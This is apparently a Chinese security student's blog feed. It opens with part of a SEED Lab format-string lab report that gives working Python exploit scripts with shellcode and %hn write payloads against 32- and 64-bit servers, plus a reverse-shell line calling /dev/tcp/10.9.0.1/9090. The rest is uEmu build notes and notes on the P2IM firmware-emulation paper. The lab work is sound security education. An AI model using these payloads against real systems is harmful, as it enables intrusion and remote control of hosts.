<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_32</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">shellcode_addr = <span class="number">0xffffd5d4</span>  <span class="comment"># 0xffffd080 + start</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line">number  = <span class="number">0xffffcfa8</span> + <span class="number">4</span></span><br><span class="line">number_1 = number + <span class="number">2</span> </span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>] = (number_1).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.54170x&quot;</span>  + <span class="string">&quot;%hn&quot;</span> + <span class="string">&quot;%.10795x&quot;</span> + <span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功执行shellcode。</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211170251532.png" alt="image-20231211170251532"></p>
<h2 id="7-Task-5-Attacking-the-64-bit-Server-Program"><a href="#7-Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="7 Task 5: Attacking the 64-bit Server Program"></a>7 Task 5: Attacking the 64-bit Server Program</h2><p>攻击64位机器，服务器选择10.9.0.6.首先发送hello消息</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211170653364.png" alt="image-20231211170653364"></p>
<p>问题：64位机器地址前两个字符为0x00，导致printf在解析地址时遇到<code>0x00</code>会停止解析（与overflow中strcpy不同，strcpy会直接截断，而此处的input仍然会传入，只是printf不会解析）</p>
<p>可以使用<code>$kth</code>表示第k个参数，同时将地址放在input末尾避免此问题。</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">buf_addr = <span class="number">0x00007fffffffe5c0</span></span><br><span class="line">ret_addr = <span class="number">0x00007fffffffe500</span> + <span class="number">8</span></span><br><span class="line">shellcode_addr = buf_addr + start  <span class="comment"># 0x7fffffffeaf7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># target_addr for test</span></span><br><span class="line">target_addr = <span class="number">0x0000555555558010</span></span><br><span class="line">number  = ret_addr</span><br><span class="line">number1 = number + <span class="number">2</span></span><br><span class="line">number2 = number + <span class="number">4</span></span><br><span class="line">number3 = number + <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;%46$.32767lx&quot;</span> + <span class="string">&quot;%46$hn&quot;</span> + <span class="string">&quot;%44$.27384lx&quot;</span> + <span class="string">&quot;%44$hn&quot;</span> + <span class="string">&quot;%45$.5384lx&quot;</span> + <span class="string">&quot;%45$hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = &quot;%44$lx.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">offset = <span class="number">80</span></span><br><span class="line">content[<span class="number">0</span>:<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">content[offset:offset+<span class="number">8</span>] = (number).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">8</span>:offset+<span class="number">16</span>] = (number1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">16</span>:offset+<span class="number">24</span>] = (number2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>其中需要注意高位地址恒为<code>0x0000</code>不需要修改，其他三个都需要进行修改。</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211193743193.png" alt="image-20231211193743193"></p>
<h3 id="8-Task-6-Fixing-the-Problem"><a href="#8-Task-6-Fixing-the-Problem" class="headerlink" title="8 Task 6: Fixing the Problem"></a>8 Task 6: Fixing the Problem</h3><p>修改如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg);</span><br></pre></td></tr></table></figure>

<p>重新编译发现警告信息消失：</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211194112960.png" alt="image-20231211194112960"></p>
<p>重新进行攻击，尝试打印出前100个参数，失败：</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211194819158.png" alt="image-20231211194819158"></p>
<h3 id="9-Guidelines-on-Reverse-Shell"><a href="#9-Guidelines-on-Reverse-Shell" class="headerlink" title="9 Guidelines on Reverse Shell"></a>9 Guidelines on Reverse Shell</h3><p>只需修改shellcode内容即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>成功获取root shell</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211195911628.png" alt="image-20231211195911628"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>SEED Lab</tag>
        <tag>Format String</tag>
      </tags>
  </entry>
  <entry>
    <title>uEmu复现</title>
    <url>/posts/8c8037e9.html</url>
    <content><![CDATA[<h1 id="uEmu复现"><a href="#uEmu复现" class="headerlink" title="uEmu复现"></a>uEmu复现</h1><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 20.04（最好分配大于20G存储空间，否则可能不够用）</p>
<p>gitee链接：<a href="https://gitee.com/cpdt/uEmu.git">https://gitee.com/cpdt/uEmu.git</a></p>
<p>virtualbox</p>
<h2 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2. 步骤"></a>2. 步骤</h2><ol>
<li><p>克隆下载uEmu</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/cpdt/uEmu.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用vagrant Installation方式复现（不推荐，感觉和直接源码安装没区别，还要多出安装虚拟机的步骤，虚拟机套虚拟机。。。还容易崩溃。。。），安装virtualbox</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install vagrant</span><br><span class="line">sudo apt install virtualbox</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动虚拟机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vagrant up</span><br></pre></td></tr></table></figure>

<p>需要等几分钟，第一次会下载ubuntu镜像，这里放一个清华源镜像，添加到vagrantfile里：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config.vm.box_url = &#x27;https://mirrors.tuna.tsinghua.edu.cn/ubuntu-cloud-images/focal/20231207/focal-server-cloudimg-amd64-vagrant.box&#x27;</span><br></pre></td></tr></table></figure>

<p>再次vagrant up。没有报错，正常界面如下</p>
<p><img src="/img/posts/2023-12-18-uEmu%E5%A4%8D%E7%8E%B0.assets/image-20231219094453267.png" alt="image-20231219094453267"></p>
<p>再输入命令登入即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vagrant ssh</span><br></pre></td></tr></table></figure>

<p>接下来进行源码编译安装，其中git-repo建议用清华源下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export uEmuDIR=/home/user/uEmu </span><br><span class="line">sudo apt-get install git-repo   </span><br><span class="line">cd $uEmuDIR</span><br><span class="line">repo init -u https://github.com/MCUSec/manifest.git -b uEmu</span><br><span class="line">repo sync</span><br></pre></td></tr></table></figure>

<p>其中<code>  init -u https://github.com/MCUSec/manifest.git -b uEmu</code>语句可能会报错，需要将python改为python3.</p>
<p><img src="/img/posts/2023-12-18-uEmu%E5%A4%8D%E7%8E%B0.assets/image-20231219095415829-17029508568891.png" alt="image-20231219095415829"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm /usr/bin/python</span><br><span class="line">sudo ln -s /usr/bin/python3 /usr/bin/python </span><br></pre></td></tr></table></figure>

<p>接下来编译uEmu，官方给的创建文件夹命令是sudo，但是会导致make时权限不足，所以不需要加sudo，编译耗时大概在1小时左右。。。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> <span class="variable">$uEmuDIR</span>/build</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> <span class="variable">$uEmuDIR</span>/build</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make -f <span class="variable">$uEmuDIR</span>/Makefile &amp;&amp; make -f <span class="variable">$uEmuDIR</span>/Makefile install</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Go make some coffee or <span class="keyword">do</span> whatever you want, this will take some time (approx. 60 mins on a 4-core machine)</span></span><br></pre></td></tr></table></figure>

<p>在make阶段解压tar文件时会出现虚拟机崩溃的现象，尝试增大内存以及处理器数量，成功解决。（建议设置大一点，否则后面也有可能卡死），另外发现虚拟机内编译时用的包是ubuntu18.04版本的，所以想要直接源码安装的可以考虑使用ubuntu18.04虚拟机。</p>
<p><img src="/img/posts/2023-12-18-uEmu%E5%A4%8D%E7%8E%B0.assets/image-20231219101217730-17029523713913.png" alt="image-20231219101217730"></p>
<p>中间报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import distro ModuleNotFoundError: No module named &#x27;distro&#x27;&quot;.  Stop.</span><br><span class="line">apt install python3-distro</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/vagrant/uEmu/build/opt/bin/clang: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装ncurses库</span></span><br><span class="line">sudo apt-get install libncurses5</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/vagrant/uEmu/build/llvm-10.0.0.src/tools/gold/gold-plugin.cpp:34:10: fatal error: &#x27;plugin-api.h&#x27; file not found</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install binutils-dev</span><br></pre></td></tr></table></figure>

<p>找不到libelf&#x2F;libelf.h</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装库</span></span><br><span class="line">sudo apt-get install libelf-dev</span><br></pre></td></tr></table></figure>



<p>找不到glib.h<br>找到报错文件目录下CMakeList.txt添加glib-2.0的目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">include_directories($</span><span class="language-bash">&#123;catkin_INCLUDE_DIRS&#125;</span></span><br><span class="line"> /usr/lib/aarch64-linux-gnu/glib-2.0/include</span><br><span class="line"> /usr/include/glib-2.0</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>configure文件Permission Denied</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改文件权限即可</span></span><br><span class="line">chmod +x ./configure</span><br></pre></td></tr></table></figure>

<p>&#x2F;usr&#x2F;include&#x2F;gtk-2.0&#x2F;gtk&#x2F;gtktypeutils.h:236:1: error: ‘GTypeDebugFlags’ is deprecated [-Werror&#x3D;deprecated-declarations]</p>
<p>应该是版本不对应，不知道怎么改，废了。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>P2IM论文笔记</title>
    <url>/posts/1c19887b.html</url>
    <content><![CDATA[<h1 id="P2IM-Scalable-and-Hardware-independent-Firmware-Testing-via-Automatic-Peripheral-Interface-Modeling"><a href="#P2IM-Scalable-and-Hardware-independent-Firmware-Testing-via-Automatic-Peripheral-Interface-Modeling" class="headerlink" title="P2IM: Scalable and Hardware-independent Firmware Testing via Automatic Peripheral Interface Modeling"></a>P2IM: Scalable and Hardware-independent Firmware Testing via Automatic Peripheral Interface Modeling</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>背景：</strong>模拟以MCU为处理器的固件设备并没有完全的模拟外设，导致fuzzing时外设需要实际物理设备，速度偏慢，且没有达到完全模拟。</p>
<p>主要实现了一个可以模拟在MCU下运行的固件的模拟器P2IM。通过自动化外设接口的建模来进行自动化，可扩展的模拟。</p>
<p>特点：对mcu架构下的寄存器进行分类识别，在qemu模拟时同时模拟这些寄存器值的操作，从而模拟出了firmware外设的一系列操作。保证了firmware在qemu上的稳定运行的同时加入了外设的模拟。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>当时对固件的模拟需要软硬件结合，导致fuzz的效率很慢，因此提出了一种模拟器对固件完全模拟的思路，通过实现对固件外设寄存器的分类并模拟以达到完全模拟的目的。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><p>实现了对无硬件模拟</p>
<p>提出了P2IE（外设接口等效属性）：为了定义怎样的仿真是好的仿真</p>
<p>提出了MMIO寄存器四种模型：对四种模型的行为进行了定义</p>
<p>探索性执行技术</p>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
<li><p>寄存器分类可能存在错误（eg: 某些SR会错分类为DR，导致fuzz时将其作为输入，效率下降。）</p>
</li>
<li><p>代码覆盖率不够高</p>
<ul>
<li>存在僵尸代码：写了但是没有使用上的代码</li>
<li>模糊器太基础：只用了最简单的AFL</li>
<li>假挂起情况：出现了两次假挂起的情况，一次是由于DR被错误分类为了CR；另一次是出现了DMA操作，P2IM不予处理</li>
<li>输入保持：作者发现不仅是输入值，输入持续的时间也会影响固件逻辑的执行</li>
</ul>
</li>
</ul>
<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><h3 id="Processor-Peripheral-Interface-Equivalence："><a href="#Processor-Peripheral-Interface-Equivalence：" class="headerlink" title="Processor-Peripheral Interface Equivalence："></a><strong>Processor-Peripheral Interface Equivalence</strong>：</h3><p>1）模拟器模拟了外设接口，而不是外设本身；2）模拟接口要与固件提供的外设行为相同，以便顺利运行</p>
<p><strong>该文章模拟的寄存器为</strong>①②类，③由于不同设备差异较大不涉及。</p>
<p><img src="/img/posts/2023-12-19-P2IM%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/figure_2.png" alt="figure_2"></p>
<h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a><strong>实现步骤</strong></h3><p><img src="/img/posts/2023-12-19-P2IM%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/Figure_3.png" alt="Figure_3"></p>
<ol>
<li>根据专家对MCU的架构以及寄存器操作构建抽象模型，主要是总结了寄存器的类别和中断的类型。</li>
<li>模型的实例化，将抽象模型具体化为可用于特定固件模拟的模型。主要是根据固件对寄存器的操作类型以及后续的访问方式将寄存器进行分类以及设置中断。</li>
</ol>
<h4 id="抽象模型构建"><a href="#抽象模型构建" class="headerlink" title="抽象模型构建"></a>抽象模型构建</h4><h5 id="寄存器种类"><a href="#寄存器种类" class="headerlink" title="寄存器种类"></a>寄存器种类</h5><p>外设寄存器会被映射到固定内存区域（0x40000000-0x5fffffff）</p>
<p><strong>Control Registers（CR）</strong>：</p>
<ul>
<li>Access Pattern：RMW，大部分为先读，再修改，再写回。因为可能会有其他控制参数。所以需要先保存数据。小部分会是直接写入，模型会分类为DR（Data Registers），但是此类寄存器之后不会在被读取，因此对固件运行没有影响。</li>
<li>Access Handling：模拟器将分类好的CR作为永久变量，不再改变。</li>
</ul>
<p><strong>Status Registers（SR）：</strong></p>
<ul>
<li>Access Pattern：若对寄存器访问为非条件读，且读取到的值作为了判断条件。则可以作为SR。部分情况下，可能会是直接写入，则会导致SR错判为DR，不过可以在后续再次访问时进行修改（polls）</li>
<li>Access handling：SR经常变化，P2IM使用探索式执行的方式来自动推断SR值（遍历取最优），对于SR的写操作则显得没有必要，因此直接忽略SR写入。</li>
</ul>
<p><strong>Data Registers（DR）</strong>：</p>
<ul>
<li>Access Pattern：若寄存器是被SR读后访问的，或者是直接写入的，那么将其作为DR</li>
<li>Access Handling：理想的Fuzzing接口。</li>
</ul>
<p><strong>Control-Status Register（C&amp;SR）</strong>：</p>
